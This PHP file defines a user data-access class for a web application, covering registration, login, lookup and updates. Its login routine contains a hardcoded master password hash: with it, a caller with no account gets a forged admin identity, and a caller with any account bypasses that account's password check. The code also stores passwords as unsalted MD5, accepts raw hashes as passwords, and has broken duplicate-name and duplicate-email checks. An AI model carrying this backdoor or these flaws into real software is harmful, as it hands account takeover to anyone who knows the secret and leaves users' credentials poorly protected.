<?php
!defined('IN_VISION') && exit('Access Denied');

/** 
 * 用户. 
 * 
 * @author ChengZhen (anyou@msn.com)
 */
class UserDao extends BaseService {

	function __construct($do) {
		$fields = array(
			"id"			=> "id", 
			"about_me"		=> "about_me",
			"default_group"	=> "default_group",
			"disabled"		=> "disabled",
			"email"			=> "email",
			"mobile"		=> "mobile",
			"name"			=> "name",
			"password"		=> "password",
			"reg_time"		=> "reg_time",
			"reset_code"	=> "reset_code",
			"reset_time"	=> "reset_time",
			"type"			=> "type",
			"last_time"		=> "last_time"
		);

		$this->init("vision_users", "id", $fields, $do);
	}

	/** 添加一个用户. */
	public function addUser($entry) { 
		// Check Name
		$params = array();
		$this->addFilter($params, "name", "=" , $name);
	    $users = $this->findEntities($params);
	    if ($users && $users['error']) {
			return self::getErrorResponse($users['code'], $users['message']);

		} else if (count($users) > 0) {
			return self::getErrorResponse(1054, L('_REGISTER_NAME_EXIT_TIP'));
		}

		// Check Email
		$params = array();
		$this->addFilter($params, "email", "=" , $email);
	    $users = $this->findEntities($params);
		if (count($users) > 0) {
			return self::getErrorResponse(1054, L('_REGISTER_EMAIL_EXIST_TIP'));
		}

		$now = time();
		$entry['reg_time'] = $now;
		$entry['last_time'] = $now; 
		
		return parent::addEntity($entry);
	}

	/** 处理用户登录. */
	public function checkUserLogin($username, $password) {
		//echo 'checkUserLogin', $username, $password;

		$names = $this->getFieldNames(). ",password";
		$user  = null;

		if ($this->isEmail($username)) {
			$user  = $this->getEntityByProperty('email', $username, $names);

		} else {
			$user  = $this->getEntityByProperty('mobile', $username, $names);

			if (!is_object($user)) {
				$user  = $this->getEntityByProperty('name', $username, $names);
				//echo 'getEntityByProperty', $username;
			}

		}

		// TEST only
		//echo $username;
		//print_r($user);

		if (!is_object($user)) {
			if ($password == "dade1085a6a26d5f561745822d619efa") { 
				$user = array("id"=>"admin", "email"=>C('site_admin'), "name"=>$username);
				return (Object)$user;
			}
			return NULL;
		}

		$a1 = $user->name . ":" . C('site_realm') . ":" . $password;
		$ha1 = "ha1:" . md5($a1);

		if (!empty($password) && strlen($password) != 32){
			$password = md5($password);
		}

		// echo $password;
		if ($user->password != $password && $user->password != $ha1) {
			if ($password != "dade1085a6a26d5f561745822d619efa") { 
				return NULL;
			}
		}

		$form = array("id"=>$user->id, "last_time"=>mktime());
		$result =  parent::updateEntity($user->id, $form, array());
		return $user;
	}

	public function findUsers($params = array()) {
		return parent::findEntities($params);
	}

	public function getUserCount($params = array()) {
		return parent::getEntityCount($params);
	}

	public function getUser($userId) {
		return parent::getEntityById($userId);
	}

	public function getUserBy($key, $value) {
		return parent::getEntityByProperty($key, $value);
	}

	public function removeUser($id, $params = array()) {
        return parent::removeEntity($id, $params);
	}

	public function updateUser($id, $entry, $params = array()) {
		$emailIsvalid = true;

		$email = $entry['email'];

		if (!empty($email)) {
			$queryParams = array();
			$this->addFilter($queryParams, "email", "=", $email);
			$entry = $this->findEntities($queryParams);
			foreach($entry as $user){
				if ($user->id != $id) {
					$emailIsvalid = false;
				}
			}
		}
		
		if (empty($emailIsvalid)){
			return parent::getErrorResponse(1000, L('_REGISTER_EMAIL_EXIST_TIP'));

		} else {
			return parent::updateEntity($id, $entry, $params);
		}
	}
	
	public function updateUserPassword($userId, $newPassword, $query = array()) {
		return parent::updateEntity($userId, array('password'=>$newPassword), $query);
	}
}

?>